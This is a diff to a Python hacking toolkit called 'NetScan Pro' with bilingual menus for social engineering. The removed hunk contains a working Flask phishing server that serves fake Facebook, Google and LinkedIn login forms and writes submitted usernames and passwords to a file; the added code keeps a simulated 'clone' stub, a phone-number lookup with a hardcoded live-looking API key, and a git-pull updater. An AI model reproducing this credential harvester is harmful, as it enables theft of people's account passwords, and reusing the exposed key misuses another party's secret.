@@ -1,94 +1,8 @@
 import os
 import subprocess
-from flask import Flask, request, render_template_string
-import time
 from colorama import init, Fore, Style
-
-app = Flask(__name__)
-
-# Páginas de login falsas (templates HTML simplificados)
-login_pages = {
-    '1': '''
-    <form method="POST" action="/capture">
-        <h2>Facebook Login</h2>
-        <label>Email:</label>
-        <input type="text" name="username"><br>
-        <label>Password:</label>
-        <input type="password" name="password"><br>
-        <button type="submit">Login</button>
-    </form>
-    ''',
-    '2': '''
-    <form method="POST" action="/capture">
-        <h2>Google Login</h2>
-        <label>Email:</label>
-        <input type="text" name="username"><br>
-        <label>Password:</label>
-        <input type="password" name="password"><br>
-        <button type="submit">Login</button>
-    </form>
-    ''',
-    '3': '''
-    <form method="POST" action="/capture">
-        <h2>LinkedIn Login</h2>
-        <label>Email:</label>
-        <input type="text" name="username"><br>
-        <label>Password:</label>
-        <input type="password" name="password"><br>
-        <button type="submit">Login</button>
-    </form>
-    '''
-}
-
-# Rota para exibir a página de login falsa
-@app.route('/')
-def login():
-    return render_template_string(login_pages[website_choice])
-
-# Rota para capturar as credenciais
-@app.route('/capture', methods=['POST'])
-def capture():
-    username = request.form['username']
-    password = request.form['password']
-    with open('captured_credentials.txt', 'a') as f:
-        f.write(f"Website: {website_choice}, Username: {username}, Password: {password}\n")
-    return "Credentials captured. You can close this window."
-
-def clone_website(choice, language):
-    global website_choice
-    website_choice = choice
-
-    app.run(port=5000)
-    if language == '1':
-        print("Server started. Open http://localhost:5000 in your browser.")
-    else:
-        print("Servidor iniciado. Abra http://localhost:5000 no seu navegador.")
-
-def fake_login_pages(language):
-    clear_console()
-    if language == '1':
-        print("Choose a website to clone for fake login:")
-        print("1. Facebook")
-        print("2. Google")
-        print("3. LinkedIn")
-        print("0. Back to Phishing Menu")
-    else:
-        print("Escolha um site para clonar para login falso:")
-        print("1. Facebook")
-        print("2. Google")
-        print("3. LinkedIn")
-        print("0. Voltar para o Menu de Phishing")
-
-    choice = input("Enter your choice: ")
-
-    if choice == '0':
-        return
-    elif choice in ['1', '2', '3']:
-        clone_website(choice, language)
-    else:
-        handle_invalid_option(language)
-
-# Funções existentes omitidas para brevidade
+import time
+import numlookupapi
 
 # Função para limpar a tela do console
 def clear_console():
@@ -139,14 +53,9 @@ def update_tool_from_github(language):
     print(Fore.YELLOW + Style.BRIGHT + "Updating NetScan Pro tool from GitHub...")
 
     try:
-        # Simulando o processo de atualização (substitua com lógica real)
-        print("Checking for updates...")
-        time.sleep(2)
-        print("Downloading updates...")
-        time.sleep(3)
-        print("Applying updates...")
-        time.sleep(2)
-        print("Updates applied successfully!")
+        # Atualização usando Git
+        subprocess.run(["git", "pull", "https://github.com/WeverttonBruno/NetScanPro.git"])
+        print("NetScan Pro tool has been updated successfully!")
 
         # Reiniciando a ferramenta após a atualização
         print("Restarting NetScan Pro tool...")
@@ -274,23 +183,13 @@ def social_engineering_tools(language):
         clear_console()
         if language == '1':
             print(Fore.YELLOW + Style.BRIGHT + " Social Engineering Tools ".center(50, '-'))
-            print("1. Phishing")
-            print("2. Spear Phishing")
-            print("3. Pretexting")
-            print("4. Baiting")
-            print("5. Tailgating/Piggybacking")
-            print("6. Fake Quizzes and Forms")
-            print("7. Vishing")
+            print("1. Phone Number Information")
+            print("2. Phishing")
             print("0. Back to Main Menu")
         else:
             print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Engenharia Social ".center(50, '-'))
-            print("1. Phishing")
-            print("2. Spear Phishing")
-            print("3. Pretexting")
-            print("4. Baiting")
-            print("5. Tailgating/Piggybacking")
-            print("6. Quizzes e Formulários Falsos")
-            print("7. Vishing")
+            print("1. Informações de Número de Telefone")
+            print("2. Phishing")
             print("0. Voltar ao Menu Principal")
 
         choice = input("Choose an option: ")
@@ -298,22 +197,24 @@ def social_engineering_tools(language):
         if choice == '0':
             return
         elif choice == '1':
+            phone_number_info(language)
+        elif choice == '2':
             phishing_menu(language)
         else:
             handle_invalid_option(language)
 
-# Função para o menu de phishing
+# Função para o submenu de phishing
 def phishing_menu(language):
     while True:
         clear_console()
         if language == '1':
             print(Fore.YELLOW + Style.BRIGHT + " Phishing Menu ".center(50, '-'))
             print("1. Fake Login Pages")
-            print("0. Back to Social Engineering Tools Menu")
+            print("0. Back to Social Engineering Tools")
         else:
             print(Fore.YELLOW + Style.BRIGHT + " Menu de Phishing ".center(50, '-'))
             print("1. Páginas de Logins Falsas")
-            print("0. Voltar para o Menu de Ferramentas de Engenharia Social")
+            print("0. Voltar para Ferramentas de Engenharia Social")
 
         choice = input("Choose an option: ")
 
@@ -323,6 +224,86 @@ def phishing_menu(language):
             fake_login_pages(language)
         else:
             handle_invalid_option(language)
+
+# Função para as páginas de logins falsas
+def fake_login_pages(language):
+    clear_console()
+    if language == '1':
+        print("Choose a website to clone for fake login:")
+        print("1. Facebook")
+        print("2. Google")
+        print("3. LinkedIn")
+        print("0. Back to Phishing Menu")
+    else:
+        print("Escolha um site para clonar para login falso:")
+        print("1. Facebook")
+        print("2. Google")
+        print("3. LinkedIn")
+        print("0. Voltar para o Menu de Phishing")
+
+    choice = input("Choose an option: ")
+
+    if choice == '0':
+        return
+    elif choice in ['1', '2', '3']:
+        clone_website(choice, language)
+    else:
+        handle_invalid_option(language)
+
+# Função para clonar um site para login falso
+def clone_website(choice, language):
+    clear_console()
+    website = ""
+    if choice == '1':
+        website = "Facebook"
+    elif choice == '2':
+        website = "Google"
+    elif choice == '3':
+        website = "LinkedIn"
+
+    if language == '1':
+        print(f"Cloning {website} for fake login...")
+    else:
+        print(f"Clonando {website} para login falso...")
+
+    # Lógica para clonar o site (simulado)
+    time.sleep(3)
+    input("Press Enter to continue...")
+
+# Função para informações de número de telefone
+def phone_number_info(language):
+    clear_console()
+    if language == '1':
+        print("Phone Number Information")
+        print("Enter a phone number to obtain information (Country Code + Carrier area code):")
+    else:
+        print("Informações de Número de Telefone")
+        print("Digite um número de telefone para obter informações(Código do País + DDD da operadora):")
+
+    phone_number = input("Phone number: ")
+
+    # Consulta à API numlookupapi para obter informações detalhadas
+    try:
+        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
+        result = client.validate(phone_number)
+        
+        # Formatando a resposta no estilo desejado
+        print("\nInformation for phone number", phone_number)
+        print("Valid:", result.get("valid", False))
+        print("Number:", result.get("number", ""))
+        print("Local Format:", result.get("local_format", ""))
+        print("International Format:", result.get("international_format", ""))
+        print("Country Prefix:", result.get("country_prefix", ""))
+        print("Country Code:", result.get("country_code", ""))
+        print("Country Name:", result.get("country_name", ""))
+        print("Location:", result.get("location", ""))
+        print("Carrier:", result.get("carrier", ""))
+        print("Line Type:", result.get("line_type", ""))
+
+    except Exception as e:
+        print(Fore.RED + f"Error fetching phone number information: {e}")
+
+    input("\nPress Enter to continue...")
 
 # Função principal para iniciar o programa
 def start_program():
